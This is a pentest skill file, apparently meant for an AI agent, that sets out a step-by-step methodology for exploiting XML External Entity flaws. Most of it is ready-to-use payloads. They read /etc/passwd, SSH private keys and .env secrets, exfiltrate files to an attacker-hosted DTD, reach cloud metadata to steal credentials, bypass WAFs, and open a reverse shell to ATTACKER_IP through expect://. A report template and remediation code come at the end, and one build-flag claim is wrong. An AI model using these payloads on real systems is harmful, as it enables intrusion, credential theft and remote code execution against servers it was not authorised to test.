---
name: xxe-phantom
description: Complete XXE (XML External Entity) detection and exploitation methodology — classic file read, blind OOB exfiltration, XInclude, SVG/DOCX/SAML vectors, WAF bypass, SSRF chaining, and report structure. Use when an endpoint accepts XML (Content-Type application/xml, or SVG/DOCX/SAML/SOAP input) and you want to read files, probe internal services, or chain to SSRF.
license: MIT
metadata:
  version: "1.0.0"
  author: Rifteo
  tags: ["xxe", "xml", "ssrf", "lfi", "blind", "oob", "saml", "pentest", "web", "bug-bounty"]
---

# XXE Phantom — XML External Entity Injection

XXE occurs when an XML parser evaluates external entity declarations (`<!ENTITY xxe SYSTEM "...">`) supplied by the attacker. Impact ranges from local file disclosure to full SSRF and, in some stacks, Remote Code Execution.

---

## Phase 1 — Find the Attack Surface

### 1.1 Explicit XML Endpoints

Look for XML in request bodies or content-type headers:

```
Content-Type: application/xml
Content-Type: text/xml
Content-Type: application/soap+xml
Content-Type: application/rss+xml
Content-Type: application/atom+xml
Content-Type: application/xhtml+xml
```

```bash
# Burp search — find requests with XML content-type
# Proxy → HTTP history → Filter → Content-Type contains "xml"

# Or grep through Burp export:
grep -rl "application/xml\|text/xml\|soap" burp_export.xml
```

### 1.2 Hidden XML — Content-Type Switching

Many JSON APIs also accept XML. Try changing `Content-Type` on any POST/PUT endpoint:

```http
# Original (JSON)
POST /api/users
Content-Type: application/json
{"username":"test"}

# Switch to XML
POST /api/users
Content-Type: application/xml
<?xml version="1.0"?>
<username>test</username>
```

If the response is the same (200, user created) — the endpoint parses XML too.

### 1.3 File Upload Vectors

These formats are ZIP-compressed XML and are parsed server-side:

| Format | Dangerous file inside ZIP |
|---|---|
| `.docx` / `.xlsx` / `.pptx` | `word/document.xml`, `xl/workbook.xml` |
| `.odt` / `.ods` | `content.xml` |
| `.svg` | The SVG file itself is XML |
| `.xsl` / `.xslt` | Stylesheet processed by XML transformer |
| `.xml` (config/import) | Any config upload feature |
| PDF (via FOP) | XSL-FO documents rendered to PDF |

### 1.4 SAML / SSO

SAML assertions are base64-encoded XML — always test:
- SSO login flows (SAMLResponse parameter)
- SP-initiated SSO (AuthnRequest)
- Single logout (LogoutRequest / LogoutResponse)

### 1.5 Other Surfaces

```
SOAP web services            → WSDL + SOAP body
WebDAV (PROPFIND)            → XML request body
RSS/Atom feed readers        → XML feed content
Excel/Calc imports           → XML-based spreadsheet
Custom XML API               → Any proprietary format
XMP metadata in images       → Embedded XML processed server-side
```

### 1.6 Confirm XML Parsing

Before injecting entities, confirm the parser echoes content back. Inject a unique canary inside an element and verify it appears in the response:

```xml
<?xml version="1.0"?>
<data><user>CANARY_1337</user></data>
```

If `CANARY_1337` appears in the response → the parser reads and reflects XML content → proceed with entity injection.

---

## Phase 2 — Classic XXE (Visible Output)

Use when the application reflects XML content in the HTTP response.

### 2.1 File Read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

**Windows targets:**

```xml
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
<!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">
```

**Check if output appears** in the response body, headers, or error messages.

### 2.2 SSRF — Internal HTTP Request

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>
```

Try internal network targets:

```xml
<!ENTITY xxe SYSTEM "http://internal-service.local/api/admin">
<!ENTITY xxe SYSTEM "http://10.0.0.1/">
<!ENTITY xxe SYSTEM "http://192.168.1.1/admin">
<!ENTITY xxe SYSTEM "http://localhost:8080/actuator/env">
<!ENTITY xxe SYSTEM "http://localhost:9200/">   <!-- Elasticsearch -->
<!ENTITY xxe SYSTEM "http://localhost:6379/">   <!-- Redis -->
```

### 2.3 Port Scanning (Time-Based)

```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:22/">     <!-- SSH — fast if open -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:3306/">   <!-- MySQL -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:5432/">   <!-- PostgreSQL -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:27017/">  <!-- MongoDB -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:11211/">  <!-- Memcached -->
```

Open port → fast response. Closed port → connection refused or timeout.

### 2.4 Multi-File Read via Multiple Entities

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY f1 SYSTEM "file:///etc/passwd">
  <!ENTITY f2 SYSTEM "file:///etc/hostname">
  <!ENTITY f3 SYSTEM "file:///proc/self/environ">
]>
<root>
  <passwd>&f1;</passwd>
  <hostname>&f2;</hostname>
  <env>&f3;</env>
</root>
```

### 2.5 Error-Based File Read

When content is NOT reflected but errors ARE:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///not-exist/%file;'>">
  %eval;
  %error;
]>
<root/>
```

The parser tries to open a file path containing the contents of `/etc/passwd` → path error includes the file content.

---

## Phase 3 — Blind XXE (No Visible Output)

When the response never reflects entity content. Use Out-of-Band (OOB) exfiltration.

### 3.1 OOB via DNS — Simplest Confirmation

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://YOUR-OOB-DOMAIN.burpcollaborator.net/">
]>
<root><data>&xxe;</data></root>
```

If you get a DNS lookup or HTTP request at your OOB server → XXE confirmed, parser fetches external resources.

**OOB tools:**
- Burp Collaborator (Burp → Collaborator → Copy to clipboard)
- interactsh: `interactsh-client` → generates unique URL
- pingb.in, canarytokens.org (passive)

### 3.2 OOB File Exfiltration via External DTD

**Step 1** — Host a malicious DTD on your server (`evil.dtd`):

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://YOUR-SERVER/?data=%file;'>">
%wrap;
%send;
```

**Step 2** — Inject a parameter entity that fetches your DTD:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://YOUR-SERVER/evil.dtd">
  %remote;
]>
<root/>
```

**Step 3** — Your server receives: `GET /?data=root:x:0:0:root:/root:/bin/bash...`

**Host the DTD:**

```bash
# Python HTTP server
python3 -m http.server 80

# Or with ngrok for public URL
ngrok http 80
```

### 3.3 OOB via FTP (bypass HTTP-only egress filters)

Some servers allow FTP but block HTTP. Host a simple FTP server:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'ftp://YOUR-SERVER:2121/%file;'>">
%wrap;
%send;
```

```bash
# Simple FTP server for capture (Python)
python3 scripts/xxe_probe.py --ftp-server --port 2121
```

### 3.4 Multi-Line File Read (Handle Newlines)

The basic approach breaks on newlines. Use PHP or Java wrappers to base64-encode first:

```xml
<!-- PHP wrapper — base64 encodes the file, no newline issues -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://YOUR-SERVER/?data=%file;'>">
%wrap;
%send;
```

Then decode:

```bash
echo "cm9vdDp4OjA..." | base64 -d
```

**Java alternative (when PHP is not available):**

```xml
<!-- Netdoc protocol — Java-specific, handles newlines better -->
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
```

### 3.5 Error-Based Blind XXE (No HTTP Egress)

When the server has no outbound internet access but does produce error messages:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %exfil;
]>
<root/>
```

Parser error: `file not found: /nonexistent/root:x:0:0:root:/root:/bin/bash...` — the file content appears inside the error message.

---

## Phase 4 — XXE via File Uploads

### 4.1 SVG Upload

SVG is XML. If the server renders SVG (thumbnail, preview, display), it may parse entities:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text>&xxe;</text>
</svg>
```

Upload as `.svg`, then view the rendered image or the server response.

**Blind SVG (OOB):**

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY % remote SYSTEM "http://YOUR-SERVER/evil.dtd">
  %remote;
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <circle cx="50" cy="50" r="40"/>
</svg>
```

### 4.2 DOCX / XLSX / PPTX (Office Open XML)

These are ZIP archives. Inject into the embedded XML:

```bash
# 1. Create a legitimate docx/xlsx
# 2. Unzip it
unzip legitimate.docx -d docx_extracted/

# 3. Edit word/document.xml (for .docx) or xl/workbook.xml (for .xlsx)
# Add at the top, after the XML declaration:
nano docx_extracted/word/document.xml
```

Add the XXE payload at the beginning of the XML file:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://YOUR-SERVER/evil.dtd">
  %remote;
]>
```

```bash
# 4. Repack
cd docx_extracted && zip -r ../malicious.docx . && cd ..

# 5. Upload malicious.docx via the target's document import/upload feature
```

### 4.3 ODT / ODS (LibreOffice / OpenDocument)

```bash
unzip legitimate.odt -d odt_extracted/
# Edit content.xml — inject DOCTYPE before root element
nano odt_extracted/content.xml
# Repack
cd odt_extracted && zip -r ../malicious.odt . && cd ..
```

### 4.4 XSL / XSLT Injection

XSLT stylesheets support `document()` and `xsl:include` which fetch external resources:

```xml
<?xml version="1.0"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <!-- Read local file via document() -->
  <xsl:template match="/">
    <xsl:value-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

```xml
<!-- SSRF via document() -->
<xsl:value-of select="document('http://169.254.169.254/latest/meta-data/')"/>
```

---

## Phase 5 — XXE via XInclude

XInclude works **without controlling the DOCTYPE** — perfect for when the app wraps your input inside its own XML document.

```xml
<!-- Inject into any XML field / attribute value -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

```xml
<!-- SSRF via XInclude -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="http://169.254.169.254/latest/meta-data/"/>
</foo>
```

**When to use XInclude:** the application constructs XML on the server-side and embeds user input inside it. You cannot inject a `DOCTYPE` because the parser receives a full document, but XInclude directives in element content are still processed.

---

## Phase 6 — SAML XXE

SAML assertions are base64-encoded XML sent in `SAMLResponse` parameters.

### 6.1 Intercept a SAML Flow

```bash
# Burp Suite → Proxy → intercept SAMLResponse parameter
# Decode the base64 value:
echo "PHNhbWxwOlJlc3BvbnNlIHhtbG5z..." | base64 -d | xmllint --format -
```

### 6.2 Inject XXE into the SAML Assertion

After decoding, find the `<samlp:Response>` root element and prepend a DOCTYPE:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://YOUR-SERVER/evil.dtd">
  %remote;
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ...>
  <!-- original assertion content -->
</samlp:Response>
```

### 6.3 Re-encode and Send

```bash
# Re-encode and URL-encode for POST
python3 -c "
import base64, urllib.parse, sys
with open('modified_saml.xml','rb') as f:
    data = f.read()
encoded = base64.b64encode(data).decode()
print(urllib.parse.quote(encoded))
" > encoded_payload.txt

# Paste into SAMLResponse= parameter in Burp Repeater
```

**Note:** SAML signatures protect the assertion content. However:
- If the SP doesn't validate the signature → inject directly
- If only the `<Assertion>` element is signed → inject in the `<Response>` wrapper outside it
- If the XML parser processes entities before signature validation → works regardless

---

## Phase 7 — Protocol Handlers

Different protocols work depending on the XML parser and server platform:

| Protocol | Usage | Platform |
|---|---|---|
| `file://` | Local file read | All |
| `http://` / `https://` | SSRF | All (if network egress allowed) |
| `ftp://` | OOB exfiltration, bypasses HTTP filters | All |
| `php://filter/...` | Base64-encoded file read (no newlines) | PHP |
| `php://input` | Read request body | PHP |
| `expect://id` | RCE (requires expect:// wrapper enabled) | PHP (rare) |
| `netdoc://` | File read — handles newlines | Java |
| `jar://` | Multi-step: fetch JAR, read file inside | Java |
| `gopher://` | SSRF to TCP services (Gopher protocol) | Java/Python |

### PHP expect:// RCE (when enabled)

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root><data>&xxe;</data></root>
```

Only works if PHP was compiled with `--enable-exif` or `expect` extension is loaded (uncommon).

### Gopher:// — SSRF to Internal TCP Services

```xml
<!-- Send a Redis command via XXE → SSRF → Gopher → Redis -->
<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A">
```

Build Gopher payloads for internal services using tools like Gopherus.

---

## Phase 8 — WAF and Filter Bypass Techniques

### 8.1 Encoding the XML Declaration

```xml
<!-- UTF-16 encoding — some WAFs don't decode before inspection -->
<!-- Generate: python3 -c "open('payload.xml','wb').write(open('payload_utf8.xml').read().encode('utf-16'))" -->
<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

```xml
<!-- UTF-7 (older parsers) -->
<?xml version="1.0" encoding="UTF-7"?>
```

### 8.2 Chunked Transfer Encoding

Split the payload across chunks so WAF pattern matching fails:

```http
POST /api/data HTTP/1.1
Content-Type: application/xml
Transfer-Encoding: chunked

1a
<?xml version="1.0"?>
1c
<!DOCTYPE root [<!ENTITY
1e
xxe SYSTEM "file:///etc/passwd
3
">]>
e
<root>&xxe;</root>
0

```

### 8.3 Alternate DOCTYPE Syntax

```xml
<!-- Multiline / indented -->
<!
DOCTYPE
root
[
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<!-- Comments inside DOCTYPE -->
<!DOCTYPE root [<!--comment--><!ENTITY xxe SYSTEM "file:///etc/passwd">]>

<!-- No space before SYSTEM -->
<!ENTITY xxe SYSTEM"file:///etc/passwd">

<!-- PUBLIC instead of SYSTEM (some parsers) -->
<!ENTITY xxe PUBLIC "-//test//" "file:///etc/passwd">
```

### 8.4 CDATA Wrapper (bypass content-type filters)

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><![CDATA[<data>]]>&xxe;<![CDATA[</data>]]></root>
```

### 8.5 Nested Parameter Entities

Obfuscate the payload through multiple levels of entity expansion:

```xml
<!DOCTYPE root [
  <!ENTITY % a "<!ENTITY &#x25; b SYSTEM 'http://YOUR-SERVER/evil.dtd'>">
  %a;
  %b;
]>
```

### 8.6 Double URL Encoding in Entity Value

```xml
<!-- When the URL in SYSTEM is decoded by WAF before inspection -->
<!ENTITY xxe SYSTEM "file%3A%2F%2F%2Fetc%2Fpasswd">
<!ENTITY xxe SYSTEM "file%253A%252F%252F%252Fetc%252Fpasswd">
```

---

## Phase 9 — Escalation Chains

### 9.1 XXE → SSRF → Cloud Metadata (AWS / GCP / Azure)

```xml
<!-- AWS IMDSv1 — retrieve IAM credentials -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<!-- Step 2: get the role name from the response, then -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME">

<!-- GCP -->
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">
<!-- Note: GCP requires Metadata-Flavor: Google header — may not work via XXE unless the parser forwards custom headers -->

<!-- Azure IMDS -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/">
```

### 9.2 XXE → LFI → SSH Private Key

```xml
<!ENTITY xxe SYSTEM "file:///home/www-data/.ssh/id_rsa">
<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">
<!ENTITY xxe SYSTEM "file:///home/ubuntu/.ssh/id_rsa">
```

Once you have the private key → SSH into the server.

### 9.3 XXE → LFI → Source Code → Credentials

```xml
<!-- Application source code -->
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
<!ENTITY xxe SYSTEM "file:///app/config/database.yml">
<!ENTITY xxe SYSTEM "file:///app/.env">
<!ENTITY xxe SYSTEM "file:///var/www/html/wp-config.php">

<!-- Application secrets -->
<!ENTITY xxe SYSTEM "file:///proc/self/environ">
<!ENTITY xxe SYSTEM "file:///etc/environment">
```

### 9.4 XXE → SSRF → Internal Admin Panels

```xml
<!-- Spring Boot Actuator (unauthenticated in older versions) -->
<!ENTITY xxe SYSTEM "http://localhost:8080/actuator/env">
<!ENTITY xxe SYSTEM "http://localhost:8080/actuator/heapdump">

<!-- Jenkins -->
<!ENTITY xxe SYSTEM "http://localhost:8080/script">

<!-- Kubernetes API -->
<!ENTITY xxe SYSTEM "http://localhost:10250/pods">
<!ENTITY xxe SYSTEM "https://kubernetes.default.svc/api/v1/secrets">

<!-- Elasticsearch -->
<!ENTITY xxe SYSTEM "http://localhost:9200/_cat/indices">
<!ENTITY xxe SYSTEM "http://localhost:9200/_all/_search">
```

### 9.5 XXE → RCE (PHP expect://)

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "expect://bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'">
]>
<root><data>&xxe;</data></root>
```

### 9.6 XXE → Gopher → Redis → RCE (Server-Side)

```bash
# Generate Gopher payload for Redis (using Gopherus)
python2 gopherus.py --exploit redis
# → generates gopher:// URL for writing cron job or PHP webshell
```

```xml
<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/GENERATED_GOPHERUS_PAYLOAD">
```

---

## Phase 10 — Automated Testing

### Burp Suite Workflow

1. **Intercept XML requests:** Proxy → HTTP history → filter Content-Type contains "xml"
2. **Send to Repeater** — manually inject the basic entity payload (Phase 2.1)
3. **Use Burp Collaborator** for blind OOB detection (Phase 3.1)
4. **Active Scan** — Burp Pro's scanner detects XXE automatically if pointed at XML endpoints
5. **BApp: Content Type Converter** — automatically retries requests with XML content-type
6. **BApp: Upload Scanner** — tests XXE in file upload fields (SVG, DOCX, etc.)

### XXEinjector (automation)

```bash
gem install xxeinjector  # or clone from GitHub

# Basic file read (visible output)
ruby XXEinjector.rb --host=YOUR-SERVER --path=/etc/passwd --file=request.txt --oob=http

# Blind OOB mode
ruby XXEinjector.rb --host=YOUR-SERVER --path=/etc/passwd --file=request.txt --oob=http --phpfilter

# Enumerate files in directory
ruby XXEinjector.rb --host=YOUR-SERVER --path=/var/www/ --file=request.txt --oob=http --enumerate

# request.txt format: the raw HTTP request with XXEINJECT marker where payload goes
```

### Script: `scripts/xxe_probe.py`

```bash
# Test single endpoint with visible output
python3 scripts/xxe_probe.py -u https://target.com/api/xml -f /etc/passwd

# Test with OOB server
python3 scripts/xxe_probe.py -u https://target.com/api/xml --oob http://YOUR-SERVER/ --file /etc/passwd

# Test file upload for XXE (SVG)
python3 scripts/xxe_probe.py -u https://target.com/upload --upload --format svg --oob http://YOUR-SERVER/

# Run FTP exfil server locally
python3 scripts/xxe_probe.py --ftp-server --port 2121
```

---

## Phase 11 — Confirm the Finding

- [ ] DOCTYPE injection accepted (no parser error, no 400 response)
- [ ] Entity value reflected in response (classic) OR OOB callback received (blind)
- [ ] File contents confirmed — at minimum first line of `/etc/passwd` showing `root:x:0:0:`
- [ ] Reproducible from a clean session without prior state
- [ ] SSRF confirmed if applicable — internal resource response or OOB DNS for internal host

**False positive checks:**
- Server returns 400 "DOCTYPE not allowed" → parser hardened, not vulnerable
- Entity syntax in response literally (`&xxe;` or `SYSTEM "..."`) → parser escaped rather than evaluated
- `CANARY_1337` reflects but `&xxe;` doesn't → reflection exists but entity expansion disabled (partial protection)
- OOB callback comes from YOUR machine, not the target → local test environment issue

---

## Phase 12 — Report Structure

```
Title: XXE Injection on [endpoint] — [Impact: Local File Read / SSRF / Blind OOB]

Severity:
  Critical: RCE via expect://, SSRF to cloud metadata with credential theft, SSH key read
  High:     Local file read (passwd, source code, .env), SSRF to internal services
  Medium:   SSRF to non-sensitive internal URLs, blind XXE confirmed but limited impact
  Low:      XXE confirmed but no external HTTP/file access allowed

CWE: CWE-611 — Improper Restriction of XML External Entity Reference
OWASP: A05:2021 – Security Misconfiguration

CVSS 3.1 Base (file read):
  AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N → 6.5 (Medium)
CVSS 3.1 Base (SSRF → internal admin, no auth):
  AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H → 10.0 (Critical)

Affected endpoint: POST https://target.com/api/xml
Content-Type: application/xml

Steps to reproduce:
1. Send the following request:
   POST /api/xml HTTP/1.1
   Host: target.com
   Content-Type: application/xml

   <?xml version="1.0"?>
   <!DOCTYPE root [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <root><name>&xxe;</name></root>

2. Observe: response body contains contents of /etc/passwd:
   root:x:0:0:root:/root:/bin/bash
   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   [...]

For Blind XXE:
1. Host evil.dtd at http://YOUR-SERVER/evil.dtd with content:
   [paste DTD]
2. Send request with: <!ENTITY % remote SYSTEM "http://YOUR-SERVER/evil.dtd"> %remote;
3. Observe OOB server receiving: GET /?data=root:x:0:0:root:...

Impact:
- [File read] Attacker can read arbitrary files accessible to the web server process
- [SSRF] Attacker can probe and interact with internal services not exposed to the internet
- [Credential theft] Application secrets, database passwords, and API keys exposed
- [Escalation] SSH private key read → server compromise / lateral movement

Evidence:
- HTTP request/response screenshot showing entity content in response
- OOB server log showing file content received (for blind)
- Screenshot of /etc/passwd contents in response

Remediation:
- Disable external entity processing in the XML parser (language-specific):

  Java (SAXParser):
    factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
    factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

  Python (lxml):
    parser = etree.XMLParser(resolve_entities=False, no_network=True)

  PHP (libxml):
    libxml_disable_entity_loader(true);   # PHP < 8.0
    # PHP 8.0+: entity loading disabled by default

  .NET:
    XmlReaderSettings settings = new XmlReaderSettings();
    settings.DtdProcessing = DtdProcessing.Prohibit;

  Node.js (libxmljs):
    libxmljs.parseXml(xml, { noent: false, dtdload: false, dtdvalid: false });

- Use a whitelist-based XML schema (XSD) to validate structure before parsing
- Reject requests with DOCTYPE declarations at the application layer
- Run the XML parser in a sandboxed environment with no network/filesystem access
- Prefer JSON over XML where XML functionality is not required
```

---

## Quick-Reference: Priority Attack Order

1. **Inject basic `file:///etc/passwd`** — confirm if reflection is visible
2. **OOB DNS check** — send entity to Collaborator URL — confirm parser makes outbound requests
3. **External DTD for blind exfil** — host `evil.dtd`, exfiltrate file contents via OOB
4. **PHP filter wrapper** — `php://filter/convert.base64-encode` for multi-line files without newline issues
5. **SSRF → cloud metadata** — `http://169.254.169.254/...` for IAM credential theft
6. **File upload XXE** — SVG → DOCX → ODT if REST endpoints are hardened
7. **XInclude** — when DOCTYPE is blocked but XML element content is user-controlled
8. **SAML** — intercept SAMLResponse, inject outside signed assertion

---

## Reference Files

- `references/payloads.md` — ready-to-use payload library (classic, blind, XInclude, SAML, XSLT, bypass)
- `references/file-targets.md` — high-value files to read per OS/framework/language
- `references/tools.md` — XXEinjector, Burp workflow, OOB servers, Gopherus
- `scripts/xxe_probe.py` — automated XXE tester with OOB detection and FTP exfil server
